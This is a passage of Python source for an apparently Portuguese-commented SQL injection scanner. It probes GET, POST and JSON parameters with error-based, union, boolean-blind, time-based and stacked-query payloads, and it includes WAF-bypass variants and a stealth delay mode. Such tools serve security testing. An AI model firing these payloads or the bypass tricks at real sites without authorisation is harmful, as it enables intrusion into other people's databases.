            "1' AND 1=CAST((SELECT 'TEST' FROM dual) AS INT)--",
            "1 AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||'TEST'||chr(62))) FROM dual)",

            # ── Generic / agnostic ────────────────────────────────────────────
            "1'; SELECT NULL--",
            "1'; SELECT NULL#",
            "1\"--",
            "1'--",
            # Stacked com sleep(0) — frequentemente revela capacidade de stacked-query
            "1'; SELECT SLEEP(0)--",
            "1'; WAITFOR DELAY '0:0:0'--",

            # ── [NEW-1] WAF-bypass comment variants ───────────────────────────
            # Comentários inline do MySQL quebram filtros simples de palavra-chave
            "1'/**/AND/**/extractvalue(0,concat(0x7e,'TEST',0x7e))/**/AND/**/'1'='1",
            # Comentário condicional do MySQL (/*! ... */) — executa só no MySQL
            "1'/*!AND*/extractvalue(0,concat(0x7e,'TEST',0x7e))/*!AND*/'1'='1",
            # Aspa URL-encoded + espaço — bypassa WAFs que decodificam preguiçosamente
            "1%27%20AND%20extractvalue(0,concat(0x7e,%27TEST%27,0x7e))%20AND%20%271%27=%271",
            # Escape de aspa simples dobrada (para apps que usam addslashes de forma imprópria)
            "1'' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND ''1''=''1",
        ]

        for payload in payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["waf"] = waf
                result["evidence"].append(f"WAF detectado ({waf}): error-based pulado")
                break

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                # [FP-6] Assinaturas de erro SQL genéricas ("syntax error near",
                # "data type mismatch", etc.) podem aparecer em erros de framework,
                # saída JavaScript ou mensagens de ORM sem nenhuma injeção.
                # Limita a confiança delas a LOW e sinaliza o risco.
                if db_type == "generic":
                    result["confidence"] = SQLiConfidence.LOW.value
                    result["evidence"].append(
                        f"Assinatura de erro GENÉRICA casada: {pattern[:60]} — "
                        f"confiança limitada a LOW (alto risco de FP; verifique manualmente)"
                    )
                else:
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Assinatura de erro {db_type.upper()} casada: {pattern[:60]}"
                    )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.5, 3))

        return result

    # ──────────────────────────────────────────────────────────
    #  [2] Union-based — [NEW-8] sondagem de colunas NULL + string
    # ──────────────────────────────────────────────────────────

    def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """
        Investiga contagens de colunas UNION SELECT e procura erros de mismatch ou
        tamanhos de resposta anormais.

        [NEW-8] Testa duas estratégias de tipo de coluna por contagem:
          - Colunas NULL  — funciona na maioria dos tipos de DB
          - Colunas string ('a','b',...) — lida com alvos que rejeitam NULL
            mas aceitam literais string (visto em alguns setups Oracle/MSSQL)
        """
        result = {
            "method":     "union_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        mismatch_at: List[int] = []
        string_cols  = lambda n: ",".join([f"'{'abcdefghij'[i % 10]}'" for i in range(n)])

        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            null_cols = ",".join(["NULL"] * n_cols)
            str_cols  = string_cols(n_cols)

            # [NEW-8] Dois grupos de payloads: colunas NULL e literais string
            payloads = [
                # NULL-based
                f"' UNION SELECT {null_cols}--",
                f"' UNION SELECT {null_cols}#",
                f"-1 UNION SELECT {null_cols}--",
                f"0 UNION ALL SELECT {null_cols}--",
                # [NEW-8] String-literal columns
                f"' UNION SELECT {str_cols}--",
                f"-1 UNION SELECT {str_cols}--",
            ]

            for payload in payloads:
                if _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, payload)
                response = self._get(test_url)
                if response is None:
                    continue

                waf = self._detect_waf(response)
                if waf:
                    result["waf"] = waf
                    result["evidence"].append(
                        f"WAF detectado ({waf}): probe UNION abortado em {n_cols} colunas"
                    )
                    return result

                body = response.text

                if self._UNION_COL_MISMATCH_RE.search(body):
                    if n_cols not in mismatch_at:
                        mismatch_at.append(n_cols)
                        result["evidence"].append(
                            f"Col-mismatch UNION em n={n_cols} — servidor processa UNION"
                        )
                    break

                sql_match = self._match_sql_errors(body)
                if sql_match:
                    db_type, pattern = sql_match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"UNION disparou erro {db_type.upper()} em n={n_cols}: "
                        f"{pattern[:50]}"
                    )
                    return result

                len_diff = abs(len(body) - baseline_len)
                if (response.status_code == 200
                        and len_diff > baseline_len * 0.20
                        and (n_cols in mismatch_at or bool(mismatch_at))):
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"UNION SELECT {n_cols} colunas: resposta Δ={len_diff}B "
                        f"(mismatches anteriores nas colunas {mismatch_at})"
                    )
                    return result

                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1.5))

        if mismatch_at:
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"Col-mismatch UNION na(s) coluna(s) {mismatch_at}: "
                f"sintaxe UNION processada pelo servidor"
            )

        return result

    # ──────────────────────────────────────────────────────────
    #  [3] Boolean blind — [NEW-4]+[NEW-5] métrica dupla + mais pares
    # ──────────────────────────────────────────────────────────

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int,
                             baseline_content: str) -> Dict:
        """
        Envia pares booleanos true/false e detecta diferenças estatisticamente significativas.

        [NEW-4] Redução de falsos positivos dual-metric:
          Ambas as condições devem valer para declarar vulnerável:
          (a) diferencial mediano de tamanho do corpo > 15% do baseline
          (b) diferencial mediano de similaridade de conteúdo > 0,05 (5 pontos percentuais)
          Isto evita falsos positivos em páginas com flutuações naturais de tamanho
          onde o comprimento muda mas a estrutura do conteúdo permanece a mesma.

        [NEW-5] Expandido de 4 para 8 pares de payloads incluindo variantes
          específicas de DB e formas terminadas com comentário.
        """
        result = {
            "method":     "boolean_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        # [NEW-5] + [FP-3] Pares de payloads booleanos.
        # O par original "OR 1=1 / OR 1=2" foi REMOVIDO: payloads baseados em OR
        # podem expandir legitimamente o conjunto de resultados (retornando mais
        # linhas do DB) sem nenhuma injeção, produzindo mudanças de tamanho
        # indistinguíveis de sinais reais de SQLi.
        # Os substitutos usam condições apenas aritméticas que avaliam na
        # cláusula WHERE sem adicionar linhas: AND (1)=(1) vs AND (1)=(2), e
        # uma variante CASE WHEN para backends que dobram aritmética simples.
        bool_payloads = [
            # Pares em contexto de string padrão
            ("1' AND '1'='1",          "true"),
            ("1' AND '1'='2",          "false"),
            # Contexto numérico
            ("1 AND 1=1",              "true"),
            ("1 AND 1=2",              "false"),
            # Variantes terminadas com comentário (lida com parsers que precisam de -- para fechar)
            ("1' AND 1=1--",           "true"),
            ("1' AND 1=2--",           "false"),
            # [FP-3] Aritmética com parênteses — sem expansão de conjunto de linhas,
            # substituto seguro do par OR removido; CASE WHEN lida com backends que
            # otimizam comparações inteiras simples
            ("1 AND (1)=(1)",          "true"),
            ("1 AND (1)=(2)",          "false"),
            ("1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1", "true"),
            ("1 AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1", "false"),
        ]

        true_lengths:    List[int]   = []
        false_lengths:   List[int]   = []
        true_sims:       List[float] = []
        false_sims:      List[float] = []

        for payload, payload_type in bool_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            sample_lengths: List[int]   = []
            sample_sims:    List[float] = []

            for _ in range(_BOOL_SAMPLES):
                if _exit_requested or _skip_current:
                    break
                r = self._get(test_url)
                if r is not None:
                    sample_lengths.append(len(r.text))
                    # [NEW-4] Também calcula a razão de similaridade (amostrada)
                    b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
                    b2  = r.text[: _PROBE_SAMPLE_BYTES]
                    sim = difflib.SequenceMatcher(None, b1, b2).ratio()
                    sample_sims.append(sim)
                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1))

            if len(sample_lengths) >= 1:
                if payload_type == "true":
                    true_lengths.extend(sample_lengths)
                    true_sims.extend(sample_sims)
                else:
                    false_lengths.extend(sample_lengths)
                    false_sims.extend(sample_sims)

            if self.stealth:
                _interruptible_sleep(random.uniform(1, 2))

        if not true_lengths or not false_lengths:
            return result

        median_true_len   = statistics.median(true_lengths)
        median_false_len  = statistics.median(false_lengths)
        len_diff          = abs(median_true_len - median_false_len)

        # [NEW-4] Diferencial de similaridade
        median_true_sim   = statistics.median(true_sims)  if true_sims  else 1.0
        median_false_sim  = statistics.median(false_sims) if false_sims else 1.0
        sim_diff          = abs(median_true_sim - median_false_sim)

        # Teto de ruído a partir da variância interna
        all_true   = true_lengths
        all_false  = false_lengths
        iv_true    = max(all_true)  - min(all_true)
        iv_false   = max(all_false) - min(all_false)
        noise_ceil = baseline_len * 0.04

        # [NEW-4] Ambas as métricas devem exceder os limiares
        len_condition = (
            len_diff > baseline_len * 0.15
            and iv_true  < noise_ceil
            and iv_false < noise_ceil
        )
        sim_condition = sim_diff > 0.05  # 5 pontos percentuais

        if len_condition and sim_condition:
            # ── [FP-4] Tripla confirmação ────────────────────────────────────
            # Reenvia o primeiro par true/false válido mais duas vezes e verifica
            # se o sinal é reprodutível. Uma única flutuação de rede ou cache miss
            # de CDN pode produzir uma mudança de tamanho isolada que passa no
            # dual-metric. Duas rodadas consistentes = confirmado; qualquer inconsistência
            # = rebaixar para LOW.
            confirm_ok = True
            first_true_payload  = next(
                (p for p, t in bool_payloads if t == "true"), "1 AND 1=1"
            )
            first_false_payload = next(
                (p for p, t in bool_payloads if t == "false"), "1 AND 1=2"
            )
            confirm_true_lens:  List[int] = []
            confirm_false_lens: List[int] = []

            for _ in range(2):
                if _exit_requested or _skip_current:
                    confirm_ok = False
                    break
                rt = self._get(self._inject_payload(url, param_name, first_true_payload))
                rf = self._get(self._inject_payload(url, param_name, first_false_payload))
                if rt is None or rf is None:
                    confirm_ok = False
                    break
                confirm_true_lens.append(len(rt.text))
                confirm_false_lens.append(len(rf.text))
                _interruptible_sleep(0.4)

            if confirm_ok and confirm_true_lens and confirm_false_lens:
                confirm_len_diff = abs(
                    statistics.median(confirm_true_lens) -
                    statistics.median(confirm_false_lens)
                )
                if confirm_len_diff > baseline_len * 0.10:
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"Boolean dual-metric + triple-confirm: "
                        f"len TRUE={median_true_len:.0f}B  FALSE={median_false_len:.0f}B  "
                        f"Δlen={len_diff:.0f}B  sim_diff={sim_diff:.3f}  "
                        f"confirm_Δ={confirm_len_diff:.0f}B  "
                        f"iv_t={iv_true:.0f}B  iv_f={iv_false:.0f}B"
                    )
                else:
                    # Tripla confirmação falhou → rebaixar
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.LOW.value
                    result["evidence"].append(
                        f"Boolean dual-metric PASSOU mas tripla confirmação FALHOU "
                        f"(confirm_Δ={confirm_len_diff:.0f}B < 10% do baseline) — "
                        f"rebaixado para LOW; provável FP de página dinâmica"
                    )
            else:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    "Boolean dual-metric passou; tripla confirmação inconclusiva "
                    "(erro de rede no re-check) — confiança LOW"
                )

        elif len_condition:
            # Tamanho passou mas similaridade não — apenas confiança LOW
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"Somente diferencial de tamanho boolean (sim_diff={sim_diff:.3f} "
                f"abaixo do limiar): "
                f"Δlen={len_diff:.0f}B — trate como confiança LOW"
            )

        return result

    # ──────────────────────────────────────────────────────────
    #  [4] Time-based blind — [NEW-3] payloads específicos por DB
    # ──────────────────────────────────────────────────────────

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        """
        Injeta payloads SLEEP e detecta delays como SQLi time-based blind.

        [NEW-3] Conjunto de payloads específico por DB em vez de só MySQL:
          - MySQL/MariaDB: SLEEP()
          - PostgreSQL:    pg_sleep()
          - MSSQL:         WAITFOR DELAY
          - Oracle:        query pesada UTL_HTTP / dbms_pipe (sem sleep nativo)
          - SQLite:        query pesada de cross-join

        Cada grupo é tentado de forma independente; o primeiro hit confirmado retorna.
        """
        result = {
            "method":     "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        baseline = self._measure_baseline_latency(url)
        if baseline is None:
            result["evidence"].append(
                "Pulado: host inalcançável ou latência do baseline alta demais"
            )
            return result

        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

        # [NEW-3] Payloads de sleep específicos por DB
        sleep_payloads_groups = [
            # MySQL / MariaDB
            [
                f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                f"1 AND SLEEP({_SLEEP_DELAY})",
                f"1' OR SLEEP({_SLEEP_DELAY})--",
            ],
            # PostgreSQL
            [
                f"1' AND pg_sleep({_SLEEP_DELAY})--",
                f"1; SELECT pg_sleep({_SLEEP_DELAY})--",
                f"1' OR pg_sleep({_SLEEP_DELAY})--",
            ],
            # MSSQL
            [
                f"1'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                f"1 WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                f"1' OR 1=1; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
            ],
            # Oracle — sem sleep nativo; usa query recursiva pesada como fallback
            [
                "1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS "
                "WHERE ROWNUM<10)--",
            ],
            # SQLite — cross join pesado
            [
                "1 AND (SELECT COUNT(*) FROM "
                "sqlite_master,sqlite_master,sqlite_master) AND 1=1",
            ],
        ]

        neutral_payload = "1' AND '1'='1"

        for sleep_group in sleep_payloads_groups:
            if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                break

            for sleep_payload in sleep_group:
                if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, sleep_payload)
                t0       = time.monotonic()
                response = self._get(test_url, extra_read=extra_read)
                elapsed  = time.monotonic() - t0

                sleep_triggered = False
                if response is None and elapsed >= threshold * 0.9:
                    sleep_triggered = True
                elif response is not None and elapsed >= threshold:
                    sleep_triggered = True

                if not sleep_triggered:
                    continue

                if response is not None:
                    waf = self._detect_waf(response)
                    if waf:
                        result["evidence"].append(
                            f"WAF detectado ({waf}): latência time-based pode ser "
                            f"delay do firewall"
                        )
                        continue

                # Confirma com requests neutros
                neutral_url    = self._inject_payload(url, param_name, neutral_payload)
                confirm_times: List[float] = []
                confirm_fails  = 0

                for _ in range(_TIMEBASED_CONFIRM):
                    if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                        break
                    t_c       = time.monotonic()
                    r_c       = self._get(neutral_url)
                    elapsed_c = time.monotonic() - t_c

                    if r_c is None:
                        confirm_fails += 1
                    else:
                        confirm_times.append(elapsed_c)

                    _interruptible_sleep(0.5)

                if confirm_fails > 0 or not confirm_times:
                    continue

                confirm_avg       = sum(confirm_times) / len(confirm_times)
                confirm_threshold = baseline + _TIMEBASED_MARGIN

                if confirm_avg <= confirm_threshold:
                    # ── [FP-5] Confirmação dupla de SLEEP ─────────────────────
                    # Reenvia o payload de sleep MAIS uma vez. Um único pico de rede
                    # pode atrasar uma resposta sem nenhum SQLi. Se o segundo
                    # hit também exceder o limiar → confiança HIGH.
                    # Se não → descarta o finding (pico eliminado como FP).
                    t_recheck  = time.monotonic()
                    r_recheck  = self._get(test_url, extra_read=extra_read)
                    el_recheck = time.monotonic() - t_recheck

                    recheck_triggered = (
                        (r_recheck is None and el_recheck >= threshold * 0.9)
                        or (r_recheck is not None and el_recheck >= threshold)
                    )

                    if not recheck_triggered:
                        result["evidence"].append(
                            f"[FP-guard] Time-based: primeiro hit elapsed={elapsed:.1f}s "
                            f"neutro confirmado mas re-check do SLEEP NÃO disparou "
                            f"(recheck={el_recheck:.1f}s) — descartado como pico de rede"
                        )
                        continue   # não declarar vulnerável

                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Time-based duplamente confirmado: "
                        f"payload=[{sleep_payload[:50]}]  "
                        f"hit1={elapsed:.1f}s  hit2={el_recheck:.1f}s  "
                        f"threshold={threshold:.1f}s  "
                        f"neutral={confirm_avg:.2f}s  baseline={baseline:.2f}s"
                    )
                    return result

        return result

    # ──────────────────────────────────────────────────────────
    #  [5] Stacked-query probe — [NEW-6]
    # ──────────────────────────────────────────────────────────

    def _test_stacked_query(self, url: str, param_name: str,
                             baseline_content: str) -> Dict:
        """
        Probe leve para suporte a stacked-query (múltiplas declarações).

        [NEW-6] Envia payloads separadores ";" que inserem uma segunda declaração
        inofensiva (SELECT NULL / SELECT 1). Detecta:
          - Assinaturas de erro SQL na resposta (confirma stacking)
          - Mudança significativa de conteúdo da resposta vs baseline (mudança de estado)
          - Anomalias de status-code (alguns servidores erram em stacked queries)

        A confiança é limitada a LOW porque o suporte a stacked-query sozinho não
        confirma explorabilidade — sinaliza que mais testes manuais
        são recomendados.
        """
        result = {
            "method":     "stacked_query",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        stacked_payloads = [
            "1'; SELECT NULL--",
            "1'; SELECT NULL#",
            "1'; SELECT 1--",
            "1'; WAITFOR DELAY '0:0:0'--",   # MSSQL — delay zero, apenas teste de stacking
            "1'; SELECT pg_sleep(0)--",       # PostgreSQL — delay zero
            "1'; SELECT NULL FROM dual--",    # Oracle
            "1'; SELECT NULL FROM sqlite_master--",  # SQLite
        ]

        for payload in stacked_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["evidence"].append(
                    f"WAF detectado ({waf}): probe stacked bloqueado"
                )
                break

            # Sinal 1 — assinatura de erro SQL
            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    f"Stacked query disparou erro {db_type.upper()}: "
                    f"{pattern[:60]} — payload: {payload[:50]}"
                )
                return result

            # Sinal 2 — mudança significativa de conteúdo vs baseline
            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
            b2  = response.text[: _PROBE_SAMPLE_BYTES]
            sim = difflib.SequenceMatcher(None, b1, b2).ratio()
            if sim < 0.80:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    f"Stacked query causou mudança significativa de conteúdo "
                    f"(similaridade={sim:.2f}): payload: {payload[:50]}"
                )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.0, 2.0))

        return result

    # ──────────────────────────────────────────────────────────
    #  Entry point principal GET
    # ──────────────────────────────────────────────────────────

    def test_sqli(self, url: str) -> Dict:
        """Roda a suíte completa de testes SQLi de parâmetros GET na url."""
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }

        if not self.has_query_params(url):
            result["message"] = "Nenhum parâmetro de consulta encontrado"
            return result

        if self.circuit_breaker.is_dead(url):
            result["message"] = "Host inalcançável (circuit breaker aberto)"
            return result

        result["tested"] = True
        params = self._extract_query_params(url)
        if not params:
            result["message"] = "Nenhum parâmetro de consulta encontrado"
            return result

        baseline = self._get_baseline_response(url)
        if baseline is None:
            result["message"] = "Não foi possível estabelecer baseline (host inalcançável)"
            return result

        baseline_status, baseline_content, baseline_len = baseline

        _bl2 = self._get(url)
        if _bl2 is not None:
            waf_on_baseline = self._detect_waf(_bl2)
            if waf_on_baseline:
                result["waf_detected"] = waf_on_baseline
                result["message"] = (
                    f"WAF detectado ({waf_on_baseline}) no baseline — "
                    f"resultados podem ter falsos negativos"
                )

        per_param_scores: List[int] = []

        # ── [FP-1] Pre-check de estabilidade da página ──────────────────────
        # Mede o quão estável a página é entre duas requests limpas.
        # Boolean-blind é pulado por parâmetro se estabilidade < _PAGE_STABILITY_MIN
        # porque conteúdo dinâmico (anúncios, feeds rotativos, timestamps) produz
        # mudanças naturais de tamanho/similaridade que imitam perfeitamente SQLi blind.
        _page_stability = self._check_page_stability(url)
        _boolean_allowed = _page_stability >= _PAGE_STABILITY_MIN

        for param_name in self._prioritize_params(params):
            if self.circuit_breaker.is_dead(url):
                result["message"] = "Host ficou inalcançável durante o teste"
                break
            if _exit_requested or _skip_current:
                break
            if not self._probe_parameter(url, param_name, baseline_content):
                continue

            param_score = 0

            # ── Error-based ───────────────────────────────────────────────────
            error_result = self._test_error_based(url, param_name)
            error_result["parameter"] = param_name
            result["tests"].append(error_result)

            if error_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = error_result["waf"]

            if error_result["vulnerable"]:
                if error_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                    result["vulnerable"]         = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    result["message"]            = f"Testados {len(params)} parâmetro(s)"
                    return result
                else:
                    param_score += 2

            # ── Union-based ───────────────────────────────────────────────────
            union_result = self._test_union_based(url, param_name, baseline_len)
            union_result["parameter"] = param_name
            result["tests"].append(union_result)

            if union_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = union_result["waf"]

            if union_result["vulnerable"]:
                if union_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1

            # ── Boolean blind ─────────────────────────────────────────────────
            # [FP-1] Pula boolean blind em páginas dinamicamente instáveis para evitar
            # falsos positivos de variação natural da página.
            if _boolean_allowed:
                # [NEW-4] Passa baseline_content para a métrica de razão de similaridade
                bool_result = self._test_boolean_blind(
                    url, param_name, baseline_len, baseline_content
                )
            else:
                bool_result = {
                    "method":     "boolean_blind",
                    "vulnerable": False,
                    "confidence": SQLiConfidence.NONE.value,
                    "evidence":   [
                        f"[FP-guard] Boolean blind pulado — estabilidade da página "
                        f"{_page_stability:.2f} < limiar {_PAGE_STABILITY_MIN} "
                        f"(conteúdo dinâmico causaria falsos positivos)"
                    ],
                }
            bool_result["parameter"] = param_name
            result["tests"].append(bool_result)
            if bool_result["vulnerable"]:
                if bool_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1  # LOW

            # ── Time-based ────────────────────────────────────────────────────
            time_result = self._test_time_based_blind(url, param_name)
            time_result["parameter"] = param_name
            result["tests"].append(time_result)
            if time_result.get("vulnerable", False):
                param_score += (
                    3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                )

            # ── [NEW-6] Stacked-query probe ───────────────────────────────────
            stacked_result = self._test_stacked_query(url, param_name, baseline_content)
            stacked_result["parameter"] = param_name
            result["tests"].append(stacked_result)
            if stacked_result["vulnerable"]:
                param_score += 1  # apenas sinal de confiança LOW

            if param_score > 0:
                per_param_scores.append(param_score)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if per_param_scores:
            best = max(per_param_scores)
            avg  = sum(per_param_scores) / len(per_param_scores)

            result["vulnerable"] = True

            if best >= 5:
                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
            elif best >= 3 or avg >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
            elif best >= 2 or avg >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
            else:
                result["overall_confidence"] = SQLiConfidence.LOW.value

        result["message"] = f"Testados {len(params)} parâmetro(s)"
        return result

    # ──────────────────────────────────────────────────────────
    #  Entry point POST — [NEW-9] multi-método
    # ──────────────────────────────────────────────────────────

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        """
        Testa parâmetros POST para SQL injection.

        [NEW-9] Promovido de error-only para error + time-based, igualando
        a cobertura de parâmetros GET. Boolean/union não incluídos aqui porque
        a semântica de POST (não idempotente, possíveis efeitos colaterais) torna
        requests diferenciais repetidas desaconselháveis sem autorização explícita.
        """
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }
        if not post_data or self.circuit_breaker.is_dead(url):
            result["message"] = "Sem parâmetros POST ou host inalcançável"
            return result

        result["tested"]  = True
        baseline_resp     = self._get(url)
        if baseline_resp is None:
            result["message"] = "Não foi possível estabelecer baseline"
            return result

        waf = self._detect_waf(baseline_resp)
        if waf:
            result["waf_detected"] = waf

        baseline_lat = self._measure_baseline_latency(url)
        confidence_scores: List[int] = []

        for param_name in self._prioritize_params(post_data):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            # ── Error-based ───────────────────────────────────────────────────
            payload_dict             = dict(post_data)
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            response = self._post(url, data=payload_dict)
            if response is None:
                if self.circuit_breaker.is_dead(url):
                    break
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "post_error_based",
                    "parameter": param_name,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            # ── [NEW-9] Time-based (POST) ─────────────────────────────────────
            if baseline_lat is not None:
                threshold  = baseline_lat + _SLEEP_DELAY + _TIMEBASED_MARGIN
                extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

                for sleep_payload in [
                    f"' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                    f"'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                    f"' AND pg_sleep({_SLEEP_DELAY})--",
                ]:
                    if _exit_requested or _skip_current:
                        break
                    timed_data             = dict(post_data)
                    timed_data[param_name] = str(post_data[param_name]) + sleep_payload

                    t0       = time.monotonic()
                    resp_t   = self._post(url, data=timed_data)
                    elapsed  = time.monotonic() - t0

                    triggered = (
                        (resp_t is None and elapsed >= threshold * 0.9)
                        or (resp_t is not None and elapsed >= threshold)
                    )

                    if triggered:
                        if resp_t and self._detect_waf(resp_t):
                            continue
                        result["vulnerable"] = True
                        result["tests"].append({
                            "method":    "post_time_based",
                            "parameter": param_name,
                            "evidence":  (
                                f"POST time-based: elapsed={elapsed:.1f}s "
                                f"threshold={threshold:.1f}s "
                                f"payload={sleep_payload[:40]}"
                            ),
                        })
                        confidence_scores.append(2)
                        break

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            best = max(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value   if best >= 3 else
                SQLiConfidence.MEDIUM.value if avg  >= 2 else
                SQLiConfidence.LOW.value
            )
            result["vulnerable"] = True

        result["message"] = f"Testados {len(post_data)} parâmetro(s) POST"
        return result

    # ──────────────────────────────────────────────────────────
    #  Entry point JSON — [NEW-9] multi-método
    # ──────────────────────────────────────────────────────────

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        """
        Testa parâmetros do corpo JSON para SQL injection.

        [NEW-9] Promovido de error-only para error + time-based.
        """
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }
        if not json_data or self.circuit_breaker.is_dead(url):
            result["message"] = "Sem parâmetros JSON ou host inalcançável"
            return result

        result["tested"]  = True
        baseline_lat      = self._measure_baseline_latency(url)
        confidence_scores: List[int] = []

        for key in json_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            # ── Error-based ───────────────────────────────────────────────────
            payload_dict      = dict(json_data)
            payload_dict[key] = str(payload_dict[key]) + "'"

            response = self._post(url, json_body=payload_dict)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "json_error_based",
                    "parameter": key,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            # ── [NEW-9] Time-based (JSON) ─────────────────────────────────────
            if baseline_lat is not None:
                threshold  = baseline_lat + _SLEEP_DELAY + _TIMEBASED_MARGIN
                extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

                for sleep_payload in [
                    f"' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                    f"'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                    f"' AND pg_sleep({_SLEEP_DELAY})--",
                ]:
                    if _exit_requested or _skip_current:
                        break
                    timed_json      = dict(json_data)
                    timed_json[key] = str(json_data[key]) + sleep_payload

                    t0      = time.monotonic()
                    resp_t  = self._post(url, json_body=timed_json)
